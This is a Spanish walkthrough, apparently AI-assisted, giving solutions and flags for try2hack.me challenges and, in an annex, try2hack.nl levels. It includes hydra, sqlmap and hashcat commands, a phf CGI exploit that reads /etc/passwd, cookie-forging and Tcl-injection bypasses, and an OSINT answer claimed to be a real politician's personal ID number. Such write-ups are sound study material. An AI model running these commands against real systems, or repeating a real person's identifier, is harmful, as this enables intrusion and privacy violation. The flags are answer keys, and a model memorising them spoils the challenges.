 

# **Guía Maestra de Soluciones: Try2Hack.me**

**Sitio web:** [try2hack.me](https://try2hack.me)

**Usuario:** `Apuromafo`

Este documento consolida las metodologías para resolver los retos de seguridad del sitio, integrando técnicas de enumeración, criptografía, análisis de tráfico y explotación web.

---

## 🟢 Reto 1: Subdominios Ocultos (DNS)

**Enunciado:** Encontrar un subdominio de más de 10 letras sin usar fuerza bruta.

### Metodología:

La forma más efectiva es consultar los registros de **Transparencia de Certificados (CT Logs)**, que son públicos.

* **Herramienta:** `Sublist3r` o inspección en [crt.sh](https://www.google.com/search?q=https://crt.sh/%3Fq%3Dtry2hack.me).
* **Comando:**
```bash
python sublist3r.py -d try2hack.me

```


* **Resultado:** Se identifica `secretsubdom.try2hack.me`. La contraseña se encuentra directamente en ese subdominio.

> **BANDERA:** `secretsubdom`

---

## 🟢 Reto 2: Cracking de Hash SHA-512

**Enunciado:** Se ha obtenido el hash del usuario `root`: `$6$VQoztKJH$0aL8rygMd8gfX7m8cTRWOn4pqQ6bA...`.

### Metodología:

El prefijo `$6$` confirma que es un hash **SHA-512 (Unix)**.

* **Herramienta:** `hashcat` o `John the Ripper`.
* **Comando:**
```bash
hashcat -m 1800 hash.txt /usr/share/wordlists/rockyou.txt

```
Session..........: hashcat
Status...........: Exhausted
Hash.Mode........: 1800 (sha512crypt $6$, SHA512 (Unix))
Hash.Target......: $6$VQoztKJH$0aL8rygMd8gfX7m8cTRWOn4pqQ6bA/jkPyQSnzU...DQc3D/
Time.Started.....: Tue Dec 30 23:47:22 2025, (2 mins, 6 secs)
Time.Estimated...: Tue Dec 30 23:49:28 2025, (0 secs)
Kernel.Feature...: Optimized Kernel (password length 0-15 bytes)
Guess.Base.......: File (rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........:   107.0 kH/s (74.28ms) @ Accel:20 Loops:500 Thr:256 Vec:1
Speed.#03........:     4964 H/s (94.36ms) @ Accel:16 Loops:62 Thr:288 Vec:1
Speed.#*.........:   111.9 kH/s
Recovered........: 0/1 (0.00%) Digests (total), 0/1 (0.00%) Digests (new)
Progress.........: 14344384/14344384 (100.00%)
Rejected.........: 244335/14344384 (1.70%)
Restore.Point....: 13559834/14344384 (94.53%)
Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:4500-5000
Restore.Sub.#03..: Salt:0 Amplifier:0-1 Iteration:4960-5000
Candidate.Engine.: Device Generator
Candidates.#01...: #douglas5 -> $HEX[042a0337c2a156616d6f732103]
Candidates.#03...: 09267722810 -> 09162808001
Hardware.Mon.#01.: Temp: 77c Util: 60% Core:1912MHz Mem:7000MHz Bus:8
Hardware.Mon.#03.: N/A
Started: Tue Dec 01 23:45:11 2024
Stopped: Tue Dec 01 23:49:29 2024


[-] Agotado sin éxito.
[!] Sugerencia: Cambia 'best66.rule' por 'rockyou-30000.rule' en el script.



> **BANDERA:** ``

---

## 🟢 Reto 3: Bypass por Geolocalización

**Enunciado:** Acceder a un panel de administración restringido exclusivamente a IPs de Sudáfrica.

### Metodología:

Se debe utilizar un **Proxy HTTP/S** con salida en Sudáfrica (ZA) para engañar al servidor.

* **Comando:**
```bash
curl -x 41.135.120.70:8080 -L https://try2hack.me/AdminPanel.php

```



> **BANDERA:** `Wi3ft0Wpizh8cV`

---

## 🟢 Reto 4: Desanonimización de Servicios Tor

**Enunciado:** Encontrar la IP real tras la dirección `.onion` de la red Tor.

### Metodología:

1. Mapear el servicio onion a un puerto local usando `socat` y el proxy de Tor.
2. Escanear con `nikto` para buscar archivos de configuración.
3. Se localiza `/server-status` de Apache, que revela el nombre de host real (`cardingphorum.com`).
4. Resolver el DNS del host para obtener la IP.

> **BANDERA:** `31.31.76.46`

---

## 🟢 Reto 5: Ataque a MS-CHAPv2 (Rogue AP)

**Enunciado:** Obtener la contraseña de `novakp` desde una captura de autenticación MS-CHAPv2.

### Metodología:

MS-CHAPv2 reduce la complejidad del cracking a un solo ataque de DES.

1. Convertir el par *challenge/response* a formato CloudCracker usando `chapcrack`.
2. Obtener el **NT hash** (vía crack.sh o similar).
3. Crackear el NT hash final con `hashcat`.

* **Comando Hashcat:**
```bash
hashcat -m 1000 -a 3 nt_hash.txt ?l?d?u?1?1?1?1?1?1?1?1 --increment

```



> **BANDERA:** `d7Mus1fH`

---

## 🟢 Reto 6: Fuerza Bruta DNS (3 caracteres)

**Enunciado:** Localizar un subdominio oculto de exactamente 3 caracteres alfanuméricos.

### Metodología:

Debido al registro *wildcard* (`*.try2hack.me`), el servidor DNS responde a cualquier consulta. La clave está en buscar el código de estado **HTTP 200** en lugar de redirecciones.

* **Script de automatización:**
```bash
for c1 in {a..z} {0..9}; do
  for c2 in {a..z} {0..9}; do
    for c3 in {a..z} {0..9}; do
      curl -s http://${c1}${c2}${c3}.try2hack.me | grep "Password" && exit
    done
  done
done

```



> **BANDERA:** `Bir63Fpw0d9MX`

---

## 🟢 Reto 7: Inteligencia de Fuentes Abiertas (OSINT)

**Enunciado:** La contraseña es el número de identificación personal del presidente checo Miloš Zeman.

### Metodología:

Búsqueda de información pública en artículos periodísticos y bases de datos filtradas sobre figuras públicas en la República Checa.

> **BANDERA:** `440928/086`

---

## 🟢 Reto 10: Análisis de Paquetes (PCAP)

**Enunciado:** Extraer una contraseña de una captura de tráfico de red.

### Metodología:

Analizar el volcado con `Wireshark`. Al filtrar por protocolos poco comunes, se detecta tráfico **SIP (VoIP)** que transporta un mensaje en texto plano.

* **Filtro:** `sip.Method == "MESSAGE"`

> **BANDERA:** `mNhr6sW9cs0sD4sVoVpwjf6C`

---

## 🟢 Reto 11: Diccionario en Administración Web

**Enunciado:** Acceder a la ruta `/manage/` protegida por autenticación HTTP básica.

### Metodología:

Ataque de diccionario contra el usuario `admin`.

* **Herramienta:** `hydra`
* **Comando:**
```bash
hydra -l admin -P rockyou.txt -s 443 -S try2hack.me https-get /manage/

```



> **BANDERA:** `Veinsg5Vskg2Fpcb`

---

## 🟢 Reto 12: Criptoanálisis (Cifrado Vernam)

**Enunciado:** Descifrar un mensaje XOR sabiendo que la firma es "Ahmed" y la clave está en un texto de *Lorem Ipsum*.

### Metodología:

1. XOR entre el final del mensaje cifrado y "Ahmed" para obtener parte de la clave.
2. Buscar el fragmento resultante en el texto de referencia para obtener la clave completa de 49 caracteres.
3. Descifrar el mensaje completo mediante XOR.

> **BANDERA:** `Dlwnb5xxHiw`

---

## 🟢 Reto 13: Ingeniería Inversa de Android (APK)

**Enunciado:** Obtener la contraseña oculta en la aplicación `findmypass.apk`.

### Metodología:

Descompilar el archivo APK para analizar el código fuente Java.

* **Comando:**
```bash
apk2java findmypass.apk
grep -R "password" ./sources/

```



> **BANDERA:** `Secure1369Pass`

---

## 🟢 Reto 14: Enumeración de Almacenamiento NFS

**Enunciado:** Encontrar un recurso compartido en red y extraer la contraseña.

### Metodología:

1. Detectar el servicio NFS (puerto 2049) con `nmap`.
2. Listar exportaciones: `showmount -e try2hack.me`.
3. Montar el recurso remoto:
```bash
sudo mount -t nfs try2hack.me:/var/nfsroot ./mnt/

```



> **BANDERA:** `Ciw27xDowP20eXnv`

---

## 🟢 Reto 15: Inyección SQL (URL Rewrite)

**Enunciado:** Explotar una vulnerabilidad en el sistema de anuncios del servidor.

### Metodología:

La URL `https://try2hack.me/a/1` parece estática pero procesa parámetros SQL.

1. Usar `sqlmap` inyectando en el punto de reescritura.
2. Dumpear la base de datos `production`.

* **Comando:**
```bash
sqlmap -u "https://try2hack.me/a/1*" --dbs --dump

```



> **BANDERA:** `Password123`

---

## 📎 Anexo: try2hack.nl (sitio distinto) — referencia cruzada / cross-site reference

> **Nota de alcance / Scope note (ES/EN):** Las fuentes públicas solicitadas (vídeos de ISOstuff y repo de dsolstad) documentan **try2hack.nl** (reto holandés clásico, niveles 1-13), **no try2hack.me** (15 retos, registro requerido). Se resumen aquí con el mismo formato como referencia cruzada; **no son soluciones de los retos 2, 8, 9 de try2hack.me**. / The requested public sources cover **try2hack.nl** (classic Dutch challenges, levels 1-13), **not try2hack.me** (15 tasks, login required). Summarized here in the same format as cross-reference; **not solutions for try2hack.me challenges 2, 8, 9**.

### Level 1: Password en JavaScript inline

**Método (ES):** Ver el fuente (`Ctrl+U`): la función `Try(passwd)` compara en claro con `'h4x0r'` y redirige al level 2.
**Method (EN):** View source: `Try(passwd)` compares in cleartext against `'h4x0r'` and redirects to level 2.

> **BANDERA:** `h4x0r`

### Level 2: Credenciales en Flash (SWF)

**Método (ES):** El clic derecho está deshabilitado; ver el código fuente (`Ctrl+U`) revela un objeto Flash `level2.swf`. Inspeccionar el SWF como texto expone `txtUsername` / `txtPassword` en claro.
**Method (EN):** Right-click is disabled; view source (`Ctrl+U`) reveals an embedded `level2.swf` Flash object. Inspecting the SWF as text exposes `txtUsername` / `txtPassword` in cleartext.

> **BANDERA:** `try2hack` / `irtehh4x0r!`

### Level 3: JavaScript externo (señuelo inline)

**Método (ES):** El JS inline es señuelo (`AbCdE`); el real está en el `JavaScript` externo (`view-source:.../JavaScript`) con `PASSWORD="try2hackrawks"`.
**Method (EN):** The inline JS is a decoy; the real one is the external `JavaScript` file with `PASSWORD="try2hackrawks"`.

> **BANDERA:** `try2hackrawks`

### Level 4: Applet Java + archivo `level4`

**Método (ES):** Decompilar `PasswdLevel4.class`: lee el archivo `level4` por URL y compara login/pass contra sus líneas; el archivo trae usuario, password y URL del level 5.
**Method (EN):** Decompile `PasswdLevel4.class`: it reads the `level4` file and matches login/pass against its lines; the file holds user, password and the level 5 URL.

> **BANDERA:** `appletking` / `pieceofcake`

### Level 5: VB3 + `Mid()` sobre alfabeto

**Método (ES):** Decompilar `LEVEL5.EXE` (VB3, requiere `vbrun300.dll`): usuario y password se arman con `Mid()` sobre la constante `gc0006` (verificado localmente).
**Method (EN):** Decompile `LEVEL5.EXE` (VB3): user and password are built with `Mid()` over the `gc0006` alphabet (verified locally).

> **BANDERA:** `Try2Hack` / `ILoveDodi`

### Level 6: Bacon por sniffer

**Método (ES):** Capturar el tráfico de `LEVEL6.EXE` (Wireshark): usuario, password y página viajan en código Bacon (grupos de 5 `a`/`b`); tabla a 26 letras decodifica el trío.
**Method (EN):** Sniff `LEVEL6.EXE` traffic: user, password and page travel as Bacon cipher (5-letter `a`/`b` groups); map to a–z to decode.

> **BANDERA:** `dabomb` / `encryptionrawks` (página `xfkohc`)

### Level 7: Cabeceras HTTP (UA + referer)

**Método (ES):** Forjar petición con `User-Agent: MSIE 7.66 + Linux` y `Referer` de microsoft.com (socket/PHP); el servidor conforme entrega la URL del level 8.
**Method (EN):** Forge UA `MSIE 7.66 + Linux` and a microsoft.com referer; the satisfied server returns the level 8 URL.

> **BANDERA:** URL del level 8 (sin credencial publicada)

### Level 8: Explotación CGI `phf` + cracking DES

**Método (ES):** Explotar el CGI vulnerable `phf` para ejecutar `cat /etc/passwd` (`?Qalias=%0A/bin/cat%20/etc/passwd`), guardar el hash DES clásico de `root` y romperlo con John the Ripper.
**Method (EN):** Exploit the vulnerable `phf` CGI to run `cat /etc/passwd`, save `root`'s classic DES hash and crack it with John the Ripper.

> **BANDERA:** `arse` (usuario `root`)

### Level 9: Manipulación de cookies (`auth=yes`)

**Método (ES):** El servidor fija cookies `str_username`, `str_password` y `auth=no`. Reenviar la petición POST de login con la cookie `auth=yes` omite la verificación.
**Method (EN):** The server sets `str_username`, `str_password` and `auth=no` cookies. Replaying the login POST with cookie `auth=yes` bypasses the check.

> **BANDERA:** sesión como `admin` (sin contraseña adicional publicada)

### Level 10: IRC + inyección eggdrop (CTCP PING)

**Método (ES):** Canal `#try2hack.level10` (key publicada): mensaje binario→texto, script del bot en ROT13 (eggdrop), inyección Tcl vía CTCP PING (`[adduser]`/`[chattr]`), cambio de pass y DCC chat que entrega el level 11.
**Method (EN):** IRC channel with key: binary→text welcome, ROT13 eggdrop script, Tcl injection via CTCP PING, password change and DCC chat yielding level 11.

> **BANDERA:** acceso al level 11 (pass del bot fijado a `123456` en el procedimiento)

### Level 11: Cálculo de posiciones (script)

**Método (ES):** Script que lee posiciones y cadena aleatoria, multiplica `ord()` de esos caracteres y postea los 5 primeros dígitos como `answer`.
**Method (EN):** Script multiplies `ord()` of the characters at the given positions and posts the first 5 digits as `answer`.

> **BANDERA:** paso a `level12-kvdsju.xhtml`

### Fuentes / Sources

* dsolstad, `walkthrough-try2hack.nl` — `level01.md`, `level03.md`, `level04.md`, `level05.md`, `level06.md`, `level07.md`, `level02.md`, `level08.md`, `level09.md`, `level10.md`, `level11.md` (repo, niveles 1-13). URL: `https://github.com/dsolstad/walkthrough-try2hack.nl`. Acceso: 2026-09-26.
* ISOstuff, `Try2hack walkthrough (part 1) - Level 1 - 6`, YouTube (~10 años, ~15K vistas). URL: `https://www.youtube.com/watch?v=eT2ct1NOQS0`. Acceso: 2026-09-26.
* ISOstuff, `Try2hack walkthrough (part 2) - Level 7 - 11`, YouTube (citado en resultados de búsqueda; URL no verificada, sin login). Acceso: 2026-09-26.
* Dan Schwarzentraub, `Try2hack.nl Level 8`, Medium (URL con acceso 403 sin autenticación; contenido verificado vía `level08.md` del repo). Acceso: 2026-09-26.

### Pendientes (honesto) / Pending (honest)

* **Reto 2 de try2hack.me (hash `$6$VQoztKJH$...`): SIN resolver.** El hash en este archivo está truncado con `...`, insuficiente para `hashcat -m 1800`; el intento con `rockyou.txt` agotó el diccionario (0/1 recuperado). Intentado: búsqueda web del fragmento de sal `VQoztKJH` (sin resultados) y revisión de fuentes públicas (corresponden a try2hack.nl, sin relación). Falta: hash completo y acceso autenticado a try2hack.me (no se hizo login).
* **Retos 8-9 de try2hack.me: SIN documentar.** try2hack.me exige registro para ver los enunciados (verificado en `https://try2hack.me` el 2026-09-26); sin login no se pueden recuperar. Los *Level 8/9* de try2hack.nl de este anexo son de otro sitio y no deben confundirse con ellos.

---
*Documentación con fines educativos. / Educational purposes only.*
_Fecha de edición: 2026-09-26_

¿Hay algún reto específico que quieras que intentemos resolver ahora usando más técnicas de **pwn** o explotación de binarios? Sería un excelente paso siguiente.